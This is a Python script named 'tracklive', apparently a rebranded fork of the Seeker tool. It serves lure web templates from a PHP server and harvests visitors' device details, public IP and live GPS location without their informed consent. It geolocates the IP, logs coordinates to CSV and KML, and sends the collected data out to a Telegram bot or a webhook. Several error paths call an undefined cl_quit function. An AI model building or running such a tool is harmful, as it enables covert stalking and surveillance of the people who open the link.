#!/usr/bin/env python3
# tracklive — Clean Live Location Tracker
# Author  : Ameen KBRD
# Version : 1.3.1

VERSION = '1.3.1'

# ── Professional color palette ──
R  = '\033[31m'       # Red       — errors / critical
G  = '\033[32m'       # Green     — success markers
C  = '\033[36m'       # Cyan      — data labels
W  = '\033[0m'        # Reset
Y  = '\033[33m'       # Yellow    — warnings / notices
B  = '\033[94m'       # Bright Blue   — banner highlight
Bd = '\033[34m'       # Blue           — banner border
Gd = '\033[92m'       # Bright Green   — box edges
M  = '\033[95m'       # Magenta        — author name

import sys
import utils
import argparse
import requests
import traceback
import shutil
from time import sleep
from os import path, kill, mkdir, getenv, environ, remove, devnull
from json import loads, decoder
from packaging import version
from datetime import datetime

parser = argparse.ArgumentParser()
parser.add_argument('-k', '--kml',       help='KML filename')
parser.add_argument('-p', '--port',      type=int, default=8080, help='Web server port [ Default : 8080 ]')
parser.add_argument('-u', '--update',    action='store_true',    help='Check for updates')
parser.add_argument('-v', '--version',   action='store_true',    help='Prints version')
parser.add_argument('-t', '--template',  type=int,               help='Load template')
parser.add_argument('-d', '--debugHTTP', type=bool, default=False, help='Disable HTTPS redirection')
parser.add_argument('-tg', '--telegram', help='Telegram bot API token [ Format -> token:chatId ]')
parser.add_argument('-wh', '--webhook',  help='Webhook URL [ POST method & unauthenticated ]')
parser.add_argument('--live-stop',       type=int, default=0,    help='Stop after N updates (0 = continuous)')

args        = parser.parse_args()
kml_fname   = args.kml
port        = getenv('PORT') or args.port
chk_upd     = args.update
print_v     = args.version
telegram    = getenv('TELEGRAM') or args.telegram
webhook     = getenv('WEBHOOK') or args.webhook
live_stop   = args.live_stop

if (getenv('DEBUG_HTTP') and (getenv('DEBUG_HTTP') == '1' or getenv('DEBUG_HTTP').lower() == 'true')) or args.debugHTTP is True:
    environ['DEBUG_HTTP'] = '1'
else:
    environ['DEBUG_HTTP'] = '0'

templateNum = int(getenv('TEMPLATE')) if getenv('TEMPLATE') and getenv('TEMPLATE').isnumeric() else args.template

path_to_script = path.dirname(path.realpath(__file__))

SITE           = ''
LOG_DIR        = f'{path_to_script}/logs'
DB_DIR         = f'{path_to_script}/db'
LOG_FILE       = f'{LOG_DIR}/php.log'
DATA_FILE      = f'{DB_DIR}/results.csv'
INFO           = f'{LOG_DIR}/info.txt'
RESULT         = f'{LOG_DIR}/result.txt'
TEMPLATES_JSON = f'{path_to_script}/template/templates.json'
TEMP_KML       = f'{path_to_script}/template/sample.kml'
META_FILE      = f'{path_to_script}/metadata.json'
META_URL       = 'https://raw.githubusercontent.com/thewhiteh4t/seeker/master/metadata.json'
PID_FILE       = f'{path_to_script}/pid'

if not path.isdir(LOG_DIR):
    mkdir(LOG_DIR)
if not path.isdir(DB_DIR):
    mkdir(DB_DIR)


# ─────────────────────────────────────────────
#  BANNER
# ─────────────────────────────────────────────

def banner():
    OW = 68          # outer box inner width
    IW = OW - 4      # inner box width

    print(f"{Bd}  ╔{'═' * OW}╗{W}")
    print(f"{Bd}  ║{' ' * OW}║{W}")
    print(f"{Bd}  ║{W}  {B}░▀█▀░█▀▄░█▀█░█▀▀░█░█░█░░░▀█▀░█░█░█▀▀{W}{' ' * 26}{Bd}║{W}")
    print(f"{Bd}  ║{W}  {B}░░█░░█▀▄░█▀█░█░░░█▀▄░█░░░░█░░▀▄▀░█▀▀{W}{' ' * 26}{Bd}║{W}")
    print(f"{Bd}  ║{W}  {B}░░▀░░▀░▀░▀░▀░▀▀▀░▀░▀░▀▀▀░▀▀▀░░▀░░▀▀▀{W}{' ' * 26}{Bd}║{W}")
    print(f"{Bd}  ║{' ' * OW}║{W}")
    print(f"{Bd}  ╠{'═' * OW}╣{W}")
    print(f"{Bd}  ║{' ' * OW}║{W}")
    print(f"{Bd}  ║{W}  {Gd}┌{'─' * IW}┐{W}  {Bd}║{W}")
    print(f"{Bd}  ║{W}  {Gd}│{W}  {B}◈{W}  {W}Version       {Gd}»{W}  {C}{VERSION:<{IW - 22}}{W}{Gd}│{W}  {Bd}║{W}")
    print(f"{Bd}  ║{W}  {Gd}│{W}  {B}◉{W}  {W}Live Tracking {Gd}»{W}  {G}[ ENABLED ]{W}{' ' * (IW - 31)}{Gd}│{W}  {Bd}║{W}")
    print(f"{Bd}  ║{W}  {Gd}│{W}  {B}✦{W}  {W}Author        {Gd}»{W}  {M}Ameen KBRD{W}{' ' * (IW - 30)}{Gd}│{W}  {Bd}║{W}")
    print(f"{Bd}  ║{W}  {Gd}└{'─' * IW}┘{W}  {Bd}║{W}")
    print(f"{Bd}  ║{' ' * OW}║{W}")
    print(f"{Bd}  ╚{'═' * OW}╝{W}")
    print()


# ─────────────────────────────────────────────
#  UPDATE CHECK
# ─────────────────────────────────────────────

def chk_update():
    try:
        print(f'{B}[*]{W} Fetching Metadata...', end='')
        rqst = requests.get(META_URL, timeout=5)
        if rqst.status_code == 200:
            print(f' {G}OK{W}')
            gh_version = loads(rqst.text)['version']
            if version.parse(gh_version) > version.parse(VERSION):
                print(f'{Y}[!]{W} New Update Available : {C}{gh_version}{W}')
            else:
                print(f'{G}[✔]{W} Already up to date.')
    except Exception as exc:
        utils.print(f'{R}[✘]{W} Exception : {str(exc)}')

if chk_upd:
    chk_update()
    sys.exit()

if print_v:
    utils.print(VERSION)
    sys.exit()


# ─────────────────────────────────────────────
#  IMPORTS (deferred)
# ─────────────────────────────────────────────

import socket
import importlib
from csv import writer
import subprocess as subp
from ipaddress import ip_address
from signal import SIGTERM

with open(devnull, 'w') as nf:
    sys.stderr = nf
    import psutil
sys.stderr = sys.__stderr__


# ─────────────────────────────────────────────
#  NOTIFICATIONS
# ─────────────────────────────────────────────

def send_webhook(content, msg_type):
    if webhook is None:
        return
    if not webhook.lower().startswith(('http://', 'https://')):
        utils.print(f'{R}[✘]{W} Protocol missing')
        return
    if webhook.lower().startswith('https://discord.com/api/webhooks'):
        from discord_webhook import discord_sender
        discord_sender(webhook, msg_type, content)
    else:
        requests.post(webhook, json=content)


def send_telegram(content, msg_type):
    if telegram is None:
        return
    parts = telegram.split(':')
    if len(parts) < 3:
        utils.print(f'{R}[✘]{W} Invalid Telegram format')
        return
    from telegram_api import tgram_sender
    tgram_sender(msg_type, content, parts)


# ─────────────────────────────────────────────
#  TEMPLATE SELECTOR
# ─────────────────────────────────────────────

def template_select(site):
    print(f'\n{Y}[!]{W} Select a Template :\n')
    with open(TEMPLATES_JSON) as f:
        templ_json = loads(f.read())
    for idx, item in enumerate(templ_json['templates']):
        print(f'  {B}[{idx}]{W} {C}{item["name"]}{W}')
    try:
        if templateNum is not None and 0 <= templateNum < len(templ_json['templates']):
            selected = templateNum
        else:
            selected = int(input(f'{B}[>]{W} '))
        if not (0 <= selected < len(templ_json['templates'])):
            raise ValueError
    except (ValueError, IndexError):
        print(f'{R}[✘]{W} Invalid Input!')
        sys.exit()
    site = templ_json['templates'][selected]['dir_name']
    print(f'{G}[✔]{W} Loading {Y}{templ_json["templates"][selected]["name"]}{W} Template...')
    imp_file = templ_json['templates'][selected]['import_file']
    importlib.import_module(f'template.{imp_file}')
    for src, dst in [
        ('php/error.php',  f'template/{site}/error_handler.php'),
        ('php/info.php',   f'template/{site}/info_handler.php'),
        ('php/result.php', f'template/{site}/result_handler.php'),
    ]:
        shutil.copyfile(src, dst)
    jsdir = f'template/{site}/js'
    if not path.isdir(jsdir):
        mkdir(jsdir)
    shutil.copyfile('js/location.js', f'{jsdir}/location.js')
    return site


# ─────────────────────────────────────────────
#  PHP SERVER
# ─────────────────────────────────────────────

def server():
    print(f'\n{G}[✔]{W} Port : {C}{port}{W}')
    print(f'{B}[*]{W} Starting PHP Server...', end='')
    port_free = False
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        try:
            sock.connect(('127.0.0.1', port))
        except ConnectionRefusedError:
            port_free = True
    if not port_free:
        if path.exists(PID_FILE):
            try:
                with open(PID_FILE) as f:
                    pid = int(f.read().strip())
                psutil.Process(pid).kill()
                sleep(1)
                print(f'\n{Y}[!]{W} Restarted PHP server')
                print(f'{B}[*]{W} Starting PHP Server...', end='')
            except (psutil.NoSuchProcess, ValueError):
                print(f' {R}[✘]{W}')
                cl_quit()
        else:
            print(f' {R}[✘]{W}')
            cl_quit()
    with open(LOG_FILE, 'w') as phplog:
        proc = subp.Popen(
            ['php', '-S', f'0.0.0.0:{port}', '-t', f'template/{SITE}/'],
            stdout=phplog, stderr=phplog
        )
        with open(PID_FILE, 'w') as f:
            f.write(str(proc.pid))
        sleep(3)
        try:
            r = requests.get(f'http://127.0.0.1:{port}/index.html', timeout=5)
            print(f' {G}[✔]{W}\n' if r.status_code == 200 else f' {R}[{r.status_code}]{W}')
        except requests.ConnectionError:
            print(f' {R}[✘]{W}')
            cl_quit()


# ─────────────────────────────────────────────
#  DATA PARSER
# ─────────────────────────────────────────────

_processed_locs = set()
_first_loc_done = False


def data_parser():
    global _processed_locs, _first_loc_done

    # ── Device info ──
    if path.exists(INFO) and path.getsize(INFO) > 0:
        with open(INFO) as f:
            raw = f.read().strip()
        if raw:
            try:
                info = loads(raw)
                with open(INFO, 'w') as f:
                    f.write('')
                _processed_locs = set()
                _first_loc_done = False

                os_   = info.get('os',      'N/A')
                plat  = info.get('platform','N/A')
                cores = info.get('cores',   'N/A')
                ram   = info.get('ram',     'N/A')
                ven   = info.get('vendor',  'N/A')
                ren   = info.get('render',  'N/A')
                res   = f'{info.get("wd","N/A")}x{info.get("ht","N/A")}'
                brw   = info.get('browser', 'N/A')
                ip    = info.get('ip',      'N/A')

                print(f'\n{C}{"━" * 55}{W}')
                print(f'{G}[+] 📱{W} New Client Connected')
                print(f'{C}{"━" * 55}{W}\n')
                print(f'{B}[i]{W} Device Information :\n')
                print(f'  {C}OS         :{W} {os_}')
                print(f'  {C}Platform   :{W} {plat}')
                print(f'  {C}CPU Cores  :{W} {cores}')
                print(f'  {C}RAM        :{W} {ram}')
                print(f'  {C}GPU Vendor :{W} {ven}')
                print(f'  {C}GPU        :{W} {ren}')
                print(f'  {C}Resolution :{W} {res}')
                print(f'  {C}Browser    :{W} {brw}')
                print(f'  {C}Public IP  :{W} {ip}')

                send_telegram(info, 'device_info')
                send_webhook(info, 'device_info')

                if ip != 'N/A':
                    try:
                        obj = ip_address(ip)
                        if obj.is_private:
                            print(f'{Y}[!]{W} Private IP — skipping recon')
                        else:
                            r = requests.get(f'https://ipwhois.app/json/{ip}', timeout=10)
                            if r.status_code == 200:
                                d = loads(r.text)
                                print(f'\n{B}[i]{W} IP Information :\n')
                                print(f'  {C}Continent :{W} {d.get("continent","N/A")}')
                                print(f'  {C}Country   :{W} {d.get("country","N/A")}')
                                print(f'  {C}Region    :{W} {d.get("region","N/A")}')
                                print(f'  {C}City      :{W} {d.get("city","N/A")}')
                                print(f'  {C}Org       :{W} {d.get("org","N/A")}')
                                print(f'  {C}ISP       :{W} {d.get("isp","N/A")}')
                                send_telegram(d, 'ip_info')
                                send_webhook(d, 'ip_info')
                    except ValueError:
                        print(f'{Y}[!]{W} Invalid IP: {ip}')
            except decoder.JSONDecodeError:
                utils.print(f'{R}[✘]{W} Failed to parse device info')

    # ── Location data ──
    if not path.exists(RESULT) or path.getsize(RESULT) == 0:
        return

    with open(RESULT) as f:
        raw = f.read().strip()
    if not raw:
        return

    for entry in raw.split('---NEXT---'):
        entry = entry.strip()
        if not entry:
            continue

        h = hash(entry)
        if h in _processed_locs:
            continue
        _processed_locs.add(h)

        try:
            loc = loads(entry)
        except decoder.JSONDecodeError:
            continue

        now = datetime.now().strftime('%H:%M:%S')

        if loc.get('status') == 'error':
            print(f'{R}[✘]{W} {loc.get("error", "Unknown error")}')
            send_telegram(loc, 'error')
            send_webhook(loc, 'error')
            continue
        if loc.get('status') != 'success':
            continue

        lat  = str(loc.get('lat', 'N/A')).replace(' deg', '').strip()
        lon  = str(loc.get('lon', 'N/A')).replace(' deg', '').strip()
        acc  = loc.get('acc', 'N/A')
        alt  = loc.get('alt', 'N/A')
        dir_ = loc.get('dir', 'N/A')
        spd  = loc.get('spd', 'N/A')

        if lat in ('N/A', '') or lon in ('N/A', ''):
            continue
        try:
            float(lat); float(lon)
        except (ValueError, TypeError):
            continue

        if not _first_loc_done:
            print(f'\n{B}[i]{W} Location Information :\n')
            print(f'  {C}Latitude  :{W} {lat}')
            print(f'  {C}Longitude :{W} {lon}')
            print(f'  {C}Accuracy  :{W} {acc}')
            if alt  not in ('N/A', '', 'Not Available'):
                print(f'  {C}Altitude  :{W} {alt}')
            if dir_ not in ('N/A', '', 'Not Available', '0 deg'):
                print(f'  {C}Direction :{W} {dir_}')
            if spd  not in ('N/A', '', 'Not Available'):
                print(f'  {C}Speed     :{W} {spd}')
            print(f'  {C}Maps      :{W} https://www.google.com/maps/place/{lat}+{lon}')
            print(f'\n{G}[✔]{W} Live tracking active — waiting for updates...\n')
            _first_loc_done = True
        else:
            spd_val   = str(spd).replace(' m/s', '').strip()
            speed_kmh = '0'
            try:
                if spd_val not in ('N/A', '', 'Not Available'):
                    speed_kmh = f'{float(spd_val) * 3.6:.1f}'
            except Exception:
                pass
            heading = ''
            if dir_ not in ('N/A', '', 'Not Available', '0 deg'):
                try:
                    deg     = float(str(dir_).replace(' deg', ''))
                    pts     = ['N', 'NE', 'E', 'SE', 'S', 'SW', 'W', 'NW']
                    heading = f' heading {pts[round(deg / 45) % 8]}'
                except Exception:
                    pass
            count = len(_processed_locs)
            print(f'{C}[{now}]{W} 📍 Update #{count}')
            print(f'    {C}Lat:{W} {lat}  {C}Lon:{W} {lon}  '
                  f'{C}Acc:{W} {acc}  {C}Speed:{W} {speed_kmh} km/h{heading}')

        with open(DATA_FILE, 'a') as f:
            writer(f).writerow([lat, lon, acc, alt, dir_, spd, now])
        send_telegram(loc, 'location')
        send_webhook(loc, 'location')
        if kml_fname is not None:
            with open(TEMP_KML) as f:
                kml = f.read().replace('LONGITUDE', lon).replace('LATITUDE', lat)
            with open(f'{path_to_script}/{kml_fname}.kml', 'w') as f:
                f.write(kml)


# ─────────────────────────────────────────────
#  HELPERS
# ─────────────────────────────────────────────

def start():
    for p in (RESULT, INFO):
        with open(p, 'w') as f:
            f.write('')
    global _processed_locs, _first_loc_done
    _processed_locs = set()
    _first_loc_done = False


def cleanup():
    if path.isfile(PID_FILE):
        with open(PID_FILE) as f:
            try:
                kill(int(f.read().strip()), SIGTERM)
            except Exception:
                pass
        remove(PID_FILE)
    sys.exit()


# ─────────────────────────────────────────────
#  ENTRY POINT
# ─────────────────────────────────────────────

try:
    banner()
    start()
    SITE = template_select(SITE)
    server()
    print(f'{G}[✔]{W} Waiting for Client...  {C}[ctrl+c to exit]{W}\n')
    while True:
        sleep(2)
        data_parser()
except KeyboardInterrupt:
    print(f'\n{Y}[!]{W} Keyboard Interrupt.')
    cleanup()
